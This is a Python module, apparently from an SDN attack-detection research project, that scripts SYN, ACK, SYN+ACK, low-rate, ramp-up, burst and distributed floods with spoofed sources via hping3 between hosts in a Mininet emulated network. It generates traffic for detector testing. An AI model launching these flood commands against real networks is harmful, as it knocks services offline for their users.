#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
LEO SDN Attack Detection - Mininet Integrated Attack Scenarios
Mininet sanal ağı içinden çalışan saldırı senaryoları

Bu modül Mininet CLI'dan çağrılabilir:
    mininet> py execfile('attack/mininet_attacks.py')
    mininet> py syn_flood(net, 'u1', 'u12', 30)
    mininet> py mixed_scenario(net, 'u1', 'u12')

Veya topology script'ine entegre edilebilir.
"""

import time
import threading
from typing import Optional


def syn_flood(net, attacker: str, target: str, duration: int = 30, 
              spoof: bool = True, port: int = 80):
    """
    SYN Flood saldırısı başlat.
    
    Args:
        net: Mininet network nesnesi
        attacker: Saldıran host adı (örn: 'u1')
        target: Hedef host adı (örn: 'u12')
        duration: Saldırı süresi (saniye)
        spoof: IP spoofing aktif mi
        port: Hedef port
    
    Kullanım:
        mininet> py syn_flood(net, 'u1', 'u12', 30)
    """
    src = net.get(attacker)
    dst = net.get(target)
    
    if not src or not dst:
        print(f"[ERROR] Host bulunamadı: {attacker} veya {target}")
        return False
    
    target_ip = dst.IP()
    
    # Komut oluştur
    spoof_flag = "--rand-source" if spoof else ""
    cmd = f"timeout {duration} hping3 -S --flood {spoof_flag} -p {port} {target_ip} &"
    
    print("="*60)
    print("  SYN FLOOD ATTACK")
    print("="*60)
    print(f"  Attacker: {attacker} ({src.IP()})")
    print(f"  Target:   {target} ({target_ip})")
    print(f"  Duration: {duration}s")
    print(f"  Port:     {port}")
    print(f"  Spoofing: {spoof}")
    print("="*60)
    print(f"  Command: {cmd}")
    print("="*60)
    
    src.cmd(cmd)
    print(f"[*] Attack started! Will run for {duration}s")
    
    return True


def ack_flood(net, attacker: str, target: str, duration: int = 30,
              spoof: bool = True, port: int = 80):
    """
    ACK Flood saldırısı başlat.
    
    Kullanım:
        mininet> py ack_flood(net, 'u1', 'u12', 30)
    """
    src = net.get(attacker)
    dst = net.get(target)
    
    if not src or not dst:
        print(f"[ERROR] Host bulunamadı: {attacker} veya {target}")
        return False
    
    target_ip = dst.IP()
    spoof_flag = "--rand-source" if spoof else ""
    cmd = f"timeout {duration} hping3 -A --flood {spoof_flag} -p {port} {target_ip} &"
    
    print("="*60)
    print("  ACK FLOOD ATTACK")
    print("="*60)
    print(f"  Attacker: {attacker} -> Target: {target} ({target_ip})")
    print(f"  Duration: {duration}s")
    print("="*60)
    
    src.cmd(cmd)
    print(f"[*] ACK Flood started!")
    
    return True


def synack_flood(net, attacker: str, target: str, duration: int = 30):
    """
    SYN+ACK Flood saldırısı.
    
    Kullanım:
        mininet> py synack_flood(net, 'u1', 'u12', 30)
    """
    src = net.get(attacker)
    dst = net.get(target)
    
    if not src or not dst:
        print(f"[ERROR] Host bulunamadı")
        return False
    
    target_ip = dst.IP()
    cmd = f"timeout {duration} hping3 -SA --flood --rand-source -p 80 {target_ip} &"
    
    print("="*60)
    print("  SYN+ACK FLOOD ATTACK")
    print("="*60)
    print(f"  {attacker} -> {target} ({target_ip}) for {duration}s")
    print("="*60)
    
    src.cmd(cmd)
    return True


def low_rate_syn(net, attacker: str, target: str, duration: int = 30, 
                 rate_pps: int = 1000):
    """
    Düşük yoğunluklu SYN Flood (rate kontrollü).
    
    Args:
        rate_pps: Paket/saniye (1000, 5000, 10000)
    
    Kullanım:
        mininet> py low_rate_syn(net, 'u1', 'u12', 30, 1000)
    """
    src = net.get(attacker)
    dst = net.get(target)
    
    if not src or not dst:
        print(f"[ERROR] Host bulunamadı")
        return False
    
    target_ip = dst.IP()
    
    # Rate to interval: 1000 pps = 1000us interval
    interval_us = int(1_000_000 / rate_pps)
    
    cmd = f"timeout {duration} hping3 -S -i u{interval_us} --rand-source -p 80 {target_ip} &"
    
    print("="*60)
    print(f"  LOW RATE SYN FLOOD ({rate_pps} pps)")
    print("="*60)
    print(f"  {attacker} -> {target} ({target_ip})")
    print(f"  Rate: {rate_pps} packets/second")
    print(f"  Duration: {duration}s")
    print("="*60)
    
    src.cmd(cmd)
    return True


def stop_attack(net, host: str):
    """
    Belirli bir hosttaki saldırıyı durdur.
    
    Kullanım:
        mininet> py stop_attack(net, 'u1')
    """
    h = net.get(host)
    if h:
        h.cmd('pkill hping3')
        print(f"[*] Stopped attacks from {host}")
    return True


def stop_all_attacks(net):
    """
    Tüm hostlardaki saldırıları durdur.
    
    Kullanım:
        mininet> py stop_all_attacks(net)
    """
    for host in net.hosts:
        host.cmd('pkill hping3')
    print("[*] All attacks stopped")
    return True


def mixed_scenario(net, attacker: str, target: str, phase_duration: int = 30):
    """
    Karışık senaryo: Normal trafik + Saldırı.
    
    Timeline:
        Phase 1 (0-30s):  Normal ping traffic
        Phase 2 (30-60s): Normal + SYN Flood
        Phase 3 (60-90s): Normal traffic only
        Phase 4 (90-120s): Normal + ACK Flood
    
    Kullanım:
        mininet> py mixed_scenario(net, 'u1', 'u12', 30)
    """
    src = net.get(attacker)
    dst = net.get(target)
    
    if not src or not dst:
        print(f"[ERROR] Host bulunamadı")
        return False
    
    target_ip = dst.IP()
    total_duration = phase_duration * 4
    
    print("="*60)
    print("  MIXED TRAFFIC SCENARIO")
    print("="*60)
    print(f"  Attacker: {attacker}")
    print(f"  Target:   {target} ({target_ip})")
    print(f"  Total Duration: {total_duration}s")
    print("")
    print("  Timeline:")
    print(f"    Phase 1 (0-{phase_duration}s):     Normal traffic")
    print(f"    Phase 2 ({phase_duration}-{phase_duration*2}s):   Normal + SYN Flood")
    print(f"    Phase 3 ({phase_duration*2}-{phase_duration*3}s):  Normal traffic")
    print(f"    Phase 4 ({phase_duration*3}-{phase_duration*4}s): Normal + ACK Flood")
    print("="*60)
    
    # Phase 1: Normal traffic only
    print(f"\n[Phase 1/{4}] Normal traffic ({phase_duration}s)...")
    src.cmd(f'ping -i 0.5 -c {phase_duration * 2} {target_ip} &')
    time.sleep(phase_duration)
    
    # Phase 2: Normal + SYN Flood
    print(f"\n[Phase 2/{4}] Normal + SYN Flood ({phase_duration}s)...")
    src.cmd(f'ping -i 0.5 -c {phase_duration * 2} {target_ip} &')
    src.cmd(f'timeout {phase_duration} hping3 -S --flood --rand-source -p 80 {target_ip} &')
    time.sleep(phase_duration)
    
    # Phase 3: Normal traffic only
    print(f"\n[Phase 3/{4}] Normal traffic ({phase_duration}s)...")
    src.cmd(f'ping -i 0.5 -c {phase_duration * 2} {target_ip} &')
    time.sleep(phase_duration)
    
    # Phase 4: Normal + ACK Flood
    print(f"\n[Phase 4/{4}] Normal + ACK Flood ({phase_duration}s)...")
    src.cmd(f'ping -i 0.5 -c {phase_duration * 2} {target_ip} &')
    src.cmd(f'timeout {phase_duration} hping3 -A --flood --rand-source -p 80 {target_ip} &')
    time.sleep(phase_duration)
    
    print("\n[*] Mixed scenario completed!")
    return True


def sequential_attacks(net, attacker: str, target: str, duration_each: int = 20):
    """
    Ardışık saldırılar: SYN -> ACK -> SYN+ACK
    
    Kullanım:
        mininet> py sequential_attacks(net, 'u1', 'u12', 20)
    """
    src = net.get(attacker)
    dst = net.get(target)
    
    if not src or not dst:
        print(f"[ERROR] Host bulunamadı")
        return False
    
    target_ip = dst.IP()
    
    print("="*60)
    print("  SEQUENTIAL ATTACKS")
    print("="*60)
    print(f"  {attacker} -> {target} ({target_ip})")
    print(f"  Each attack: {duration_each}s")
    print("="*60)
    
    attacks = [
        ('SYN', '-S'),
        ('ACK', '-A'),
        ('SYN+ACK', '-SA')
    ]
    
    for i, (name, flag) in enumerate(attacks, 1):
        print(f"\n[Attack {i}/{len(attacks)}] {name} Flood...")
        cmd = f'timeout {duration_each} hping3 {flag} --flood --rand-source -p 80 {target_ip}'
        src.cmd(cmd)
        print(f"  Completed!")
        
        if i < len(attacks):
            print("  Cooling down (5s)...")
            time.sleep(5)
    
    print("\n[*] Sequential attacks completed!")
    return True


def ramp_up_attack(net, attacker: str, target: str, duration: int = 60):
    """
    Kademeli artış saldırısı: 1000 -> 3000 -> 5000 -> 10000 pps
    
    Kullanım:
        mininet> py ramp_up_attack(net, 'u1', 'u12', 60)
    """
    src = net.get(attacker)
    dst = net.get(target)
    
    if not src or not dst:
        print(f"[ERROR] Host bulunamadı")
        return False
    
    target_ip = dst.IP()
    rates = [1000, 3000, 5000, 10000]
    phase_duration = duration // len(rates)
    
    print("="*60)
    print("  RAMP UP ATTACK")
    print("="*60)
    print(f"  {attacker} -> {target} ({target_ip})")
    print(f"  Rates: {rates} pps")
    print("="*60)
    
    for i, rate in enumerate(rates, 1):
        print(f"\n[Phase {i}/{len(rates)}] Rate: {rate} pps...")
        interval_us = int(1_000_000 / rate)
        cmd = f'timeout {phase_duration} hping3 -S -i u{interval_us} --rand-source -p 80 {target_ip}'
        src.cmd(cmd)
    
    print("\n[*] Ramp up attack completed!")
    return True


def burst_attack(net, attacker: str, target: str, 
                 burst_count: int = 5, burst_duration: int = 5, gap: int = 10):
    """
    Patlama saldırısı: Kısa süreli yoğun saldırılar.
    
    Args:
        burst_count: Patlama sayısı
        burst_duration: Her patlama süresi (saniye)
        gap: Patlamalar arası bekleme (saniye)
    
    Kullanım:
        mininet> py burst_attack(net, 'u1', 'u12', 5, 5, 10)
    """
    src = net.get(attacker)
    dst = net.get(target)
    
    if not src or not dst:
        print(f"[ERROR] Host bulunamadı")
        return False
    
    target_ip = dst.IP()
    
    print("="*60)
    print("  BURST ATTACK")
    print("="*60)
    print(f"  {attacker} -> {target} ({target_ip})")
    print(f"  {burst_count} bursts x {burst_duration}s with {gap}s gaps")
    print("="*60)
    
    for i in range(1, burst_count + 1):
        print(f"\n[Burst {i}/{burst_count}] Attacking...")
        cmd = f'timeout {burst_duration} hping3 -S --flood --rand-source -p 80 {target_ip}'
        src.cmd(cmd)
        
        if i < burst_count:
            print(f"  Gap: waiting {gap}s...")
            time.sleep(gap)
    
    print("\n[*] Burst attack completed!")
    return True


def quick_test(net, attacker: str = 'u1', target: str = 'u12'):
    """
    Hızlı 10 saniyelik SYN Flood testi.
    
    Kullanım:
        mininet> py quick_test(net)
        mininet> py quick_test(net, 'u1', 'u12')
    """
    return syn_flood(net, attacker, target, duration=10)


def distributed_attack(net, attackers: list, target: str, duration: int = 30):
    """
    Dağıtık saldırı: Birden fazla host'tan eşzamanlı saldırı.
    
    Kullanım:
        mininet> py distributed_attack(net, ['u1', 'u2', 'u3'], 'u12', 30)
    """
    dst = net.get(target)
    if not dst:
        print(f"[ERROR] Target bulunamadı: {target}")
        return False
    
    target_ip = dst.IP()
    
    print("="*60)
    print("  DISTRIBUTED (DDoS) ATTACK")
    print("="*60)
    print(f"  Attackers: {attackers}")
    print(f"  Target:    {target} ({target_ip})")
    print(f"  Duration:  {duration}s")
    print("="*60)
    
    for attacker in attackers:
        src = net.get(attacker)
        if src:
            cmd = f'timeout {duration} hping3 -S --flood --rand-source -p 80 {target_ip} &'
            src.cmd(cmd)
            print(f"  [*] Started attack from {attacker}")
        else:
            print(f"  [!] Host not found: {attacker}")
    
    print(f"\n[*] DDoS attack started from {len(attackers)} hosts!")
    return True


def capture_traffic(net, host: str, duration: int = 30, 
                    output_file: str = '/tmp/capture.pcap'):
    """
    Trafik yakala (tcpdump).
    
    Kullanım:
        mininet> py capture_traffic(net, 'u12', 30, '/tmp/attack.pcap')
    """
    h = net.get(host)
    if not h:
        print(f"[ERROR] Host bulunamadı: {host}")
        return False
    
    iface = h.defaultIntf().name
    cmd = f'timeout {duration} tcpdump -i {iface} -w {output_file} &'
    
    print(f"[*] Capturing traffic on {host} ({iface}) for {duration}s")
    print(f"[*] Output: {output_file}")
    
    h.cmd(cmd)
    return True


def show_help():
    """Yardım mesajı göster."""
    help_text = """
╔══════════════════════════════════════════════════════════════════════╗
║                    MININET ATTACK COMMANDS                           ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  TEMEL SALDIRILAR:                                                   ║
║  ─────────────────                                                   ║
║  py syn_flood(net, 'u1', 'u12', 30)      # SYN Flood (30s)          ║
║  py ack_flood(net, 'u1', 'u12', 30)      # ACK Flood                ║
║  py synack_flood(net, 'u1', 'u12', 30)   # SYN+ACK Flood            ║
║  py low_rate_syn(net, 'u1', 'u12', 30, 1000)  # 1000 pps            ║
║                                                                      ║
║  SENARYOLAR:                                                         ║
║  ───────────                                                         ║
║  py quick_test(net)                      # Hızlı 10s test           ║
║  py mixed_scenario(net, 'u1', 'u12', 30) # Normal + Saldırı         ║
║  py sequential_attacks(net, 'u1', 'u12') # SYN->ACK->SYN+ACK        ║
║  py ramp_up_attack(net, 'u1', 'u12', 60) # Kademeli artış           ║
║  py burst_attack(net, 'u1', 'u12')       # Patlama saldırısı        ║
║                                                                      ║
║  DAĞITIK SALDIRI:                                                    ║
║  ────────────────                                                    ║
║  py distributed_attack(net, ['u1','u2','u3'], 'u12', 30)            ║
║                                                                      ║
║  KONTROL:                                                            ║
║  ────────                                                            ║
║  py stop_attack(net, 'u1')               # Host'un saldırısını dur  ║
║  py stop_all_attacks(net)                # Tüm saldırıları durdur   ║
║                                                                      ║
║  TRAFİK YAKALAMA:                                                    ║
║  ────────────────                                                    ║
║  py capture_traffic(net, 'u12', 30, '/tmp/attack.pcap')             ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""
    print(help_text)


# Modül yüklendiğinde yardım göster
if __name__ != '__main__':
    print("\n[*] Mininet Attack Module loaded!")
    print("[*] Type: py show_help()  for available commands\n")

